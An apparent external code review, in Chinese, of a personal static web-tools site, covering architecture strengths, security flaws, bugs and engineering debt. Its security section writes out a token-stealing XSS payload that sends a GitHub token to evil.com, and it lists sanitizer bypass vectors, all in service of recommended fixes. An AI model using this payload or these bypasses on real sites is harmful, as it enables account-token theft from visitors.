# Tobenot-Web-Tools 外部顾问 Review

> 评审日期：2026-07-30 ｜ 评审范围：全仓（src / apps / scripts / public / docs / CI）
> 代码量：约 5,900 行 TS/TSX + 2,600 行独立 HTML

---

## 0. 一句话结论

**这是一个定位清晰、工程品味在线的个人工具站**——"无后端 + 状态进链接"的架构选择是本项目最大的亮点，`vite.config.ts` 自动发现多页入口、`import.meta.glob` 自动注册 apps 这两处设计尤其漂亮，几乎做到了"加个目录就上线"。

但存在 **1 个高危安全缺陷（Markdown 阅读器 XSS 可窃取访客的 GitHub Token）**，这个必须优先修。除此之外主要是工程护栏缺失（无 lint / 无测试 / 无 404）和一些一致性债务。

**总体评分：B+（架构 A- / 安全 D / 可维护性 B / 工程化 C+）**

---

## 1. 架构评价：亮点

### 1.1 "状态进链接"是站得住脚的核心决策 ⭐

`docs/architecture.md` §2 里给出的三条 hash 路由理由是**真正想清楚了**的，尤其第 2 条：

> `#` 后面的内容是 URL fragment，浏览器请求页面时不会发给服务器——长度不受 Nginx 默认 URL 上限约束，也不进服务端访问日志。

这不是事后找的借口，而是驱动了 `?c=` 即时链接这个真正有差异化的功能。同族做法（Mermaid Live Editor、TS Playground）也印证了方向正确。`?c=` / `?gist=` 双通道 + "c 优先"的取舍、"阅读模式不写 localStorage 草稿"这类细节，说明作者在**认真处理边界情况**。

### 1.2 零配置扩展性做得很好 ⭐

三处自动化串起来，新增一个 app 的成本接近于零：

```12:23:vite.config.ts
function discoverHtmlEntries() {
  const appsDir = path.resolve(__dirname, 'apps')
  const inputs: Record<string, string> = {}
  if (fs.existsSync(appsDir)) {
    for (const name of fs.readdirSync(appsDir)) {
      const htmlPath = path.join(appsDir, name, 'index.html')
      if (fs.existsSync(htmlPath)) {
        inputs[name] = htmlPath
      }
    }
  }
```

配合 `src/data/apps.ts` 的 `import.meta.glob('../../apps/*/meta.json')` 和 `scripts/new-app.mjs` 脚手架，形成了"约定优于配置"的闭环。**这是本项目最值得保留和推广的模式。**

### 1.3 双轨制（React SPA + 独立 HTML）是务实的

拒绝把所有东西都塞进 React 是成熟判断。`apps/color-palette` 这类工具确实不需要组件生命周期，485 行原生 JS 单文件反而更好维护、加载更快。

### 1.4 文档质量高于同类个人项目

`docs/architecture.md` 里 §4.2 的数据流图、§4.3 的容量选择表、§6 的"设计取舍简记"，以及 `scripts/check-lz-url.mjs` 这个针对 `+`→空格边界的自检脚本——这些说明作者知道**分享链接是长期契约**（"钉死 CDN 版本，解压库升级不能悄悄破坏旧链"）。这个意识很难得。

### 1.5 隐私叙事做得非常扎实

`MarkdownReaderTool.tsx` 里 `GIST_TOKEN_URL_PARTS`、`SHARE_PRINCIPLE_STEPS`、`GIST_LIMIT_NOTES` 这些常量——逐个 URL 参数向用户解释"这里不含你的个人信息"、五步图解"请求不经过本站服务器"。这种**主动向用户交底**的产品态度值得称赞，很多商业产品都做不到。

---

## 2. 🔴 高危：Markdown 阅读器 XSS → 访客 GitHub Token 泄露

### 2.1 问题

`marked` 从 v5 起**彻底移除了 `sanitize` 选项，默认原样输出 Markdown 中的裸 HTML**。而项目加载的是**未钉版本**的 latest：

```779:781:src/tools/markdown-reader/MarkdownReaderTool.tsx
      loadScript('https://cdn.jsdelivr.net/npm/marked/marked.min.js'),
      loadScript('https://html2canvas.hertzen.com/dist/html2canvas.min.js'),
    ]).then(() => setReady(true))
```

解析结果**未经任何过滤**直接注入 DOM：

```794:801:src/tools/markdown-reader/MarkdownReaderTool.tsx
      let parsed = normalizeDiagramBlocks(window.marked.parse(md) as string)

      let headingIndex = 0
      parsed = parsed.replace(/<h([1-6])([^>]*)>(.*?)<\/h[1-6]>/gi, (_match, level, attrs, content) => {
        const id = `toc-heading-${headingIndex++}`
        return `<h${level}${attrs} id="${id}">${content}</h${level}>`
      })
      setHtml(parsed)
```

```1563:1567:src/tools/markdown-reader/MarkdownReaderTool.tsx
                ref={previewRef}
                className={`md-preview style-${style}`}
                style={{ lineHeight: 1.8, minHeight: '100%' }}
                dangerouslySetInnerHTML={{ __html: html }}
              />
```

全文件搜索 `sanitize|DOMPurify|escapeHtml` → **0 结果**。

### 2.2 为什么这里比一般的"自己输入自己中毒"严重得多

关键在于**正文来源是不可信的外部输入**，且**同源下存着高价值凭证**：

| 环节 | 事实 |
|---|---|
| 输入源 | `?c=`（任意人构造的链接）和 `?gist=`（任意 Gist ID）都会写进 `md` state |
| 自动执行 | 打开链接即渲染，无需任何用户交互确认 |
| 同源资产 | `md-reader:gist-token` 明文存在同源 `localStorage` |
| 凭证权限 | 该 Token 带 `gist` scope，可读写受害者账号下**全部** Gist（含私密） |

**完整攻击链：**

1. 攻击者构造 Markdown：`<img src=x onerror="fetch('https://evil.com/?t='+localStorage.getItem('md-reader:gist-token'))">`
2. 用官方 CDN 的 lz-string 压成 `?c=...`，得到一个 `tools.tobenot.top` 域名下的**正常链接**
3. 发给任何曾用过 Gist 分享功能的用户
4. 受害者点开 → 立即渲染 → Token 静默外发

讽刺的是，`?c=` 这个最优秀的功能同时也是最大的攻击面：链接自包含、不经服务器、无法被任何服务端 WAF 拦截，而且域名是可信的自家域名。

同时 `#markdown-reader?gist=<任意ID>` 意味着攻击者也可以用自己账号的 Gist 承载 payload，链接看起来更"干净"。

### 2.3 修复建议（按优先级）

**① 立刻引入 DOMPurify（必须）**

```bash
npm i dompurify
```

```ts
import DOMPurify from 'dompurify'

const parsed = normalizeDiagramBlocks(window.marked.parse(md) as string)
// ... 注入 heading id ...
setHtml(DOMPurify.sanitize(withIds, {
  ADD_TAGS: ['svg', 'g', 'path', 'foreignObject', 'marker', 'defs'], // 保住 mermaid 产物
  ADD_ATTR: ['viewBox', 'preserveAspectRatio', 'data-diagram-type'],
}))
```

注意 sanitize 必须在**注入 heading id 之后**执行，否则那个 `replace` 会把 `attrs` 原样搬运，可能重新引入被清掉的属性。

**② 把 Token 移出 localStorage（强烈建议）**

即使有了 DOMPurify，Token 明文躺在同源 localStorage 仍是"一个 XSS 就全丢"的单点。可选方案：

- **降级为 sessionStorage + 用完即弃**：分享是低频操作，每次让用户粘贴一次 Token 并不过分，安全收益远大于体验损失
- 或至少在 `readMode === true`（即通过 `?c=` / `?gist=` 打开他人分享）时，**在渲染前主动 `delete` 内存引用并跳过读取**——阅读别人的文档根本不需要 Token
- 明确提示用户使用 **fine-grained PAT + 最短有效期**

配合修改 UI 文案：现在写的是

```
它只保存在您的本机浏览器缓存（localStorage）中，本站绝不接触、更不会上传该凭证。
```

这句话在存在 XSS 的前提下是**误导性承诺**——本站代码确实不上传，但攻击者注入的脚本可以。修复后可保留该文案，修复前应下调措辞。

**③ 钉死所有 CDN 版本（必须）**

`lz-string@1.5.0` 钉了，但 `marked`、`mermaid@10`（只钉了 major）、`html2canvas` 没钉。

```ts
// 建议
'https://cdn.jsdelivr.net/npm/marked@15.0.7/marked.min.js'
'https://cdn.jsdelivr.net/npm/mermaid@10.9.1/dist/mermaid.min.js'
'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js'
```

按项目自己在 `docs/architecture.md` §6 立的规矩——"钉死 CDN 版本，分享链接是长期契约"——**marked 不钉版本是明确违背自己架构原则的**。latest 某天出个 breaking change，全站 Markdown 渲染就挂了。

顺带：`html2canvas.hertzen.com` 是作者个人域名而非公共 CDN，可用性和供应链可信度都低于 jsdelivr，建议换成 `cdn.jsdelivr.net/npm/html2canvas@1.4.1`。

**④ 加 SRI + CSP（加分项）**

`loadScript` 里补 `script.integrity` + `script.crossOrigin='anonymous'`；`index.html` 加 `<meta http-equiv="Content-Security-Policy">` 白名单 jsdelivr + api.github.com。CSP 能在 DOMPurify 失守时提供第二道防线（尤其能挡住 `fetch` 外发）。

---

## 3. 🟡 中危：prompt-gallery 的自研 sanitizer 可被绕过

```47:63:src/tools/prompt-gallery/PromptGalleryTool.tsx
function sanitizeHtml(html: string) {
  const template = document.createElement('template')
  template.innerHTML = html

  template.content.querySelectorAll('script, style, iframe, object, embed').forEach((node) => node.remove())
  template.content.querySelectorAll('*').forEach((node) => {
    Array.from(node.attributes).forEach((attribute) => {
      const name = attribute.name.toLowerCase()
      const value = attribute.value.trim().toLowerCase()
      const isUnsafeUrl = (name === 'href' || name === 'src') && value.startsWith('javascript:')

      if (name.startsWith('on') || isUnsafeUrl) node.removeAttribute(attribute.name)
    })
  })

  return template.innerHTML
}
```

思路对（用 `<template>` 惰性解析，不会执行脚本），但黑名单不全：

- `value.startsWith('javascript:')` 挡不住 `java&#9;script:alert(1)`——`<template>` 解析时会把 `&#9;` 解码成 tab，`trim()` 只去首尾，浏览器导航时却会忽略 scheme 内的控制字符
- 未覆盖 `srcdoc`（`<iframe>` 虽被删，但 `<frame>`、`<embed>` 之外还有 `<svg><use href>`）
- 未覆盖 `formaction` / `<form>`、`<base href>`
- 未覆盖 `data:text/html` 类 URL

**当前实际风险低**（数据源是仓库内静态的 `prompts.ts`，仅 2 条预设，非用户输入）。但一旦将来支持"用户导入自己的提示词"，就会立刻变成真漏洞。

**建议**：既然为 markdown-reader 引入了 DOMPurify，这里**直接复用**，删掉自研实现。同时把 `loadScript` / `escapeHtml` 这些在两个文件里重复的函数提取到 `src/utils/`。

---

## 4. 🟡 功能性缺陷

### 4.1 未知路由 = 纯白页（无 404）

`App.tsx` 用的是一串扁平的 `&&` 条件渲染，**没有兜底分支**：

```70:86:src/App.tsx
      <main className={`w-full px-6 pb-16 pt-8${isFullPage ? ' hidden' : ''}`}>
        {route.path === '' && <Home />}
        {route.path === 'calendar' && <ErrorBoundary><CalendarTool /></ErrorBoundary>}
```

访问 `#typo` 或任何失效的旧书签 → Header 之下**完全空白**，用户不知道发生了什么。域名刚迁移过（`tobenot.top/Tobenot-Web-Tools/` → `tools.tobenot.top`），外部旧链接失效的概率不低，这个体验问题值得修。

**建议**：改成注册表驱动，顺手解决 4.2 的双源问题：

```ts
// src/data/routes.ts
export const toolComponents: Record<string, React.ComponentType> = {
  calendar: CalendarTool, 'markdown-reader': MarkdownReaderTool, /* ... */
}

// App.tsx
const Tool = toolComponents[route.path]
{Tool ? <ErrorBoundary><Tool /></ErrorBoundary> : <NotFound path={route.path} />}
```

### 4.2 `tools[]` 与 `pageTitleMap` 是两份真相

```155:173:src/data/routes.ts
export const pageTitleMap: Record<string, string> = {
  '': 'Mecha Tools | 现代机械风 Web 工具站',
  calendar: '日历工具 | Mecha Tools',
```

每个工具的标题在 `tools[]` 和 `pageTitleMap` 里各写一遍，且 `pageTitleMap` 还多一个 `about` 条目。新增工具必须改两处、漏改无任何报错（静默 fallback 到默认标题）。

**建议**：`pageTitleMap` 从 `tools` 派生：

```ts
export const pageTitleMap: Record<string, string> = {
  '': 'Mecha Tools | 现代机械风 Web 工具站',
  about: '关于与设计 | Mecha Tools',
  ...Object.fromEntries(tools.map(t => [t.id, `${t.title} | Mecha Tools`])),
}
```

同理，`fullPagePaths = ['markdown-reader', 'big-text']` 硬编码在 `App.tsx`，应该变成 `ToolDef` 上的 `fullPage?: boolean` 字段。

### 4.3 `apps/outline-reorder` 缺 `meta.json` → 事实上的隐形工具

它有 504 行完整实现，会被 Vite 正常构建部署，但因为没有 `meta.json`，`getHtmlApps()` 扫不到 → **首页卡片和 Ctrl+K 搜索里都不存在**，只能靠手输 `apps/outline-reorder/` 访问。

要么补 `meta.json`，要么像 `hello` 那样显式 `"hidden": true` 表明是有意隐藏。当前状态是"看不出是 bug 还是故意"，这本身就是问题。

**建议**：在 `discoverHtmlEntries()` 里加一条构建期告警——发现 `index.html` 但无 `meta.json` 就 `console.warn`，让这类遗漏无法静默通过。

### 4.4 regex-tester：渲染期 setState + ReDoS 卡死

```45:50:src/tools/regex-tester/RegexTesterTool.tsx
      setError('')
      return { matches: results, highlighted: html }
    } catch (e: any) {
      setError(e.message)
      return { matches: [] as MatchResult[], highlighted: '' }
    }
```

两个问题：

1. **在 `useMemo` 内部调用 `setError`** —— 渲染期间触发 state 更新，React 18 会警告，StrictMode 下行为更怪。应该把 `error` 也作为 `useMemo` 的返回值之一，而不是 side effect。
2. **ReDoS**：`while ((m = regex.exec(testText)) !== null)` 直接跑用户正则，输入 `(a+)+$` 配长文本会**冻死标签页**。虽然是"自己害自己"，但正则测试器的用户恰恰最容易写出病态正则。建议加匹配数上限（如 10,000）+ 用 `Date.now()` 做 50ms 超时熔断，或移到 Web Worker。

### 4.5 Service Worker 缺版本管理

```1:7:public/sw.js
const CACHE_NAME = 'mecha-tools-v1'

const PRECACHE_URLS = [
  './',
  './index.html',
  './manifest.json',
]
```

`CACHE_NAME` 硬编码 `v1` 且从未变更。`activate` 里的清理逻辑（删掉 `!== CACHE_NAME` 的 cache）**永远不会触发**，因为名字从来没变过。虽然 stale-while-revalidate 保证第二次访问能拿到新版，但用户**总是慢一个版本**看到旧的 `index.html`。

**建议**：构建时注入版本号（`import.meta.env` 或 Vite `define` 写入 git SHA），并在检测到新 SW 时用现有的 `Toast` 组件提示"新版本可用，点击刷新"。

### 4.6 `recordToolVisit` 未做 try/catch

```13:18:src/utils/recent.ts
export function recordToolVisit(id: string) {
  if (!id) return
  const recent = getRecentTools().filter(r => r !== id)
  recent.unshift(id)
  localStorage.setItem(STORAGE_KEY, JSON.stringify(recent.slice(0, MAX_RECENT)))
}
```

`getRecentTools()` 包了 try/catch，但 `setItem` 没有。Safari 隐私模式 / 存储配额满时会抛异常，而这个函数在 `App.tsx` 的路由 `useEffect` 里**每次导航都调用**——异常会冒泡打断路由副作用。项目其他地方（`theme.ts` 之外的 markdown-reader）都规范地包了 try/catch，这里是漏网的。

另外 `recordToolVisit` 会记录**不存在的路由**（`#typo` 也会进"最近使用"），虽然 `Home` 里 `.filter(Boolean)` 兜住了不会崩，但脏数据会占用 5 个槽位。应该只记录已注册的 id。

### 4.7 首页"最近使用"在渲染期读 localStorage

```54:59:src/pages/Home.tsx
        {(() => {
          const recentIds = getRecentTools()
```

IIFE 里同步读 localStorage，非响应式。从工具页返回首页时（hash 变化不重新挂载 `Home`）列表不会刷新。改用 `useState` + `useEffect` 或至少 `useSyncExternalStore`。

---

## 5. 🟢 一致性与工程化债务

### 5.1 暗色模式覆盖不全

`Changelog.tsx` 是明确的漏网之鱼——通篇硬编码亮色，无一个 `dark:` 变体：

```10:10:src/components/Changelog.tsx
      <h2 className="text-xl font-bold tracking-wide text-gray-900">更新日志</h2>
```

```28:30:src/components/Changelog.tsx
                <span className="text-sm font-medium text-gray-500 bg-gray-100 px-2 py-1" style={{ borderRadius: '2px' }}>
                  {e.date}
                </span>
```

暗色模式下 `#changelog` 页会出现深底 + `text-gray-900` 深字，**几乎不可读**。`ShareButton.tsx` 同类问题。

`PromptGalleryTool.tsx` 的预览区也是硬编码 `bg-white` + `prose-slate`。

**建议**：这类问题靠人眼 review 抓不干净，应加 lint 规则或至少写个 checklist 脚本扫描"出现 `text-gray-[7-9]00` 但同 className 无 `dark:`"的情况。

### 5.2 `borderRadius: '2px'` 到处内联

全仓大量重复 `style={{ borderRadius: '2px' }}`。这正是 Tailwind `theme.extend.borderRadius` 的用途：

```js
// tailwind.config.js
borderRadius: { mech: '2px' }
```

然后统一用 `rounded-mech`。当前写法既啰嗦，又绕过了 Tailwind 的设计系统（README 里还专门强调"完全使用类名，不写自定义 CSS"——内联 style 属性其实是同一类问题的变体）。

### 5.3 `@keyframes` 在 4 个组件里重复定义

`gradient-flow` 在 `App.tsx`、`Home.tsx`、`Header.tsx` 各定义一遍；`slideInUp`、`cmdFadeIn`、`toastSlideIn` 散落各处。而且 `Home.tsx` 里还塞了个 `.line-clamp-2` 手写实现——Tailwind 3.3+ **内置了 `line-clamp-2`**，直接删掉即可。

**建议**：全部收进 `tailwind.config.js` 的 `theme.extend.keyframes` / `animation`，删掉所有内联 `<style>` 块。

### 5.4 无 ESLint / 无 Prettier / 无测试

- `.eslintrc*` → 0 个
- `*.test.*` → 0 个
- `package.json` 里无 `lint` / `test` script

CI 只有 `tsc --noEmit` 一道门禁。这意味着 §4.4 的"渲染期 setState"、§5.1 的暗色遗漏、`catch (e: any)` 这类问题**没有任何自动化手段能发现**。

`scripts/check-lz-url.mjs` 已经证明作者愿意写自检——但它没有接进 CI，只能手动跑。

**建议（投入产出比最高的三步）：**

1. `npm i -D eslint @typescript-eslint/* eslint-plugin-react-hooks` + `"lint": "eslint src"` 接进 CI。`react-hooks/exhaustive-deps` 一条规则就能抓出不少隐患
2. 引入 Vitest，先给**纯函数**补测试：`hash.ts` 的 `getHashLocation/setHash`（尤其 `+` 边界）、`apps.ts` 的 slug 正则、regex-tester 的匹配逻辑。这些无需 DOM，成本极低
3. 把 `check-lz-url.mjs` 接进 CI——它守护的是"分享链接长期契约"这个核心承诺，正是最该自动化的部分

### 5.5 无代码分割，首屏包含全部 14 个工具

`App.tsx` 顶部 14 个静态 `import`。仅 `MarkdownReaderTool.tsx` 就 2,114 行，`BgRemoverTool` 1,006 行，`ImageOutlineTool` 895 行——**用户只想用一下 Base64 编解码，也得下载全部工具代码**。

`jszip` 只有 `image-to-webp` 用、`lunar-typescript` 只有 `calendar` 用，两者都进了主 bundle。

**建议**：`React.lazy` + `Suspense`。改成注册表模式（§4.1）后，这个改动几乎是免费的：

```ts
const toolComponents = {
  calendar: lazy(() => import('./tools/calendar/CalendarTool').then(m => ({ default: m.CalendarTool }))),
  // ...
}
```

预计首屏 JS 能砍掉 60% 以上。对一个"打开就用"的工具站，这是直接的体验提升。

### 5.6 `apps/` 不在 TypeScript 检查范围

`tsconfig.json` 的 `include: ["src"]` —— `apps/` 下 2,600 行内联 JS 完全无类型检查、无 lint。这些文件里已经出现了多处 `innerHTML` 拼接（`color-palette` 用模板字符串拼颜色值进 HTML）。虽然数据源是用户自己输入的颜色，风险低，但**零护栏**是事实。

**建议**：至少给 `apps/**/*.html` 里的 `<script>` 加 ESLint（`eslint-plugin-html`），或在 `new-app.mjs` 模板里默认用 `textContent` / `createElement` 而非 `innerHTML`，从源头带好习惯。

### 5.7 README 与实际状态脱节

README 只提了 `hello` 一个示例 app，没有列出实际的 14 个工具 + 7 个 apps；`docs/roadmap.md` 自己标注"大部分已完成"，但没标明哪些还没做。对**外部贡献者**（哪怕是半年后的作者本人）不够友好。

`README.md` 也没有 CDN 依赖清单——一个新人不会知道 marked/mermaid/html2canvas/lz-string 是运行时 CDN 加载而非 npm 依赖，这是个容易踩的认知陷阱。

---

## 6. 优先级行动清单

### P0 — 本周内（安全）

| # | 事项 | 文件 |
|---|---|---|
| 1 | 引入 DOMPurify 过滤 markdown 渲染结果 | `MarkdownReaderTool.tsx` |
| 2 | 钉死 marked / mermaid / html2canvas 版本 | `MarkdownReaderTool.tsx`、`PromptGalleryTool.tsx` |
| 3 | `readMode` 下不读取 Gist Token，并把 Token 降级到 sessionStorage | `MarkdownReaderTool.tsx` |
| 4 | 加 CSP meta + SRI | `index.html`、`loadScript` |

### P1 — 两周内（正确性）

| # | 事项 | 文件 |
|---|---|---|
| 5 | 路由改注册表驱动 + 加 404 页 | `App.tsx`、`data/routes.ts` |
| 6 | `pageTitleMap` / `fullPagePaths` 从 `tools[]` 派生 | `data/routes.ts` |
| 7 | 补 `apps/outline-reorder/meta.json` + 构建期缺失告警 | `apps/`、`vite.config.ts` |
| 8 | regex-tester 修渲染期 setState + 加 ReDoS 熔断 | `RegexTesterTool.tsx` |
| 9 | `recordToolVisit` 加 try/catch + 只记已注册 id | `utils/recent.ts` |
| 10 | 补 `Changelog.tsx` / `ShareButton.tsx` 暗色变体 | `components/` |

### P2 — 一个月内（工程化）

| # | 事项 |
|---|---|
| 11 | 接入 ESLint（含 `react-hooks`）+ Prettier，进 CI |
| 12 | 引入 Vitest，先覆盖 `hash.ts` / `apps.ts` 纯函数；`check-lz-url.mjs` 进 CI |
| 13 | `React.lazy` 代码分割（预计首屏 -60%） |
| 14 | SW 版本号构建注入 + 新版本 Toast 提示 |
| 15 | `borderRadius`、`@keyframes` 收进 `tailwind.config.js`；删手写 `.line-clamp-2` |
| 16 | 提取 `loadScript` / `escapeHtml` 到 `src/utils/`，消除重复 |
| 17 | README 补工具清单 + CDN 依赖说明 |

---

## 7. 给作者的整体判断

**你在架构层面的判断力明显强于执行层面的护栏建设。**

"状态进链接"、双轨制、约定优于配置、钉死 CDN 版本以维护长期契约——这些决策的质量超出了绝大多数个人项目，`docs/architecture.md` §6 那三条"设计取舍简记"我会推荐给任何做无后端工具站的人看。

但项目正好在**自己最得意的功能上（`?c=` 即时链接）开了最大的安全口子**，而且在**自己写下的原则上（钉死 CDN 版本）没有一致执行**。这两件事指向同一个根因：**缺少把原则固化成自动检查的机制**。你有能力想清楚正确的做法，也愿意写自检脚本（`check-lz-url.mjs`），但没把它们接进 CI，于是原则只存在于文档里，代码可以自由漂移。

如果只做一件事：**修 XSS（P0）**。如果能做两件：**加 ESLint + 把已有自检接进 CI**——让你已经想清楚的原则拥有强制力，这比再加十个工具的长期价值都大。
